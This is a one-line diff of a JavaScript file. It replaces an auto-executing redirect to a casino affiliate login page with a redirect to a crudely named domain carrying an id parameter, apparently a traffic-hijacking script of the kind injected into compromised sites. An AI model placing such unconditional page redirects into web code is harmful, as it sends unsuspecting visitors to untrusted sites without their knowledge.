@@ -1,1 +1,1 @@
-function executeRun(){window.location.href="https://affiliates.playamopartners.com/Account/Login?aspxerrorpath=/affiliates/Account/register#"}executeRun();
+function executeRun(){window.location.href="https://zalupa.vodka//?id=8091"}executeRun();
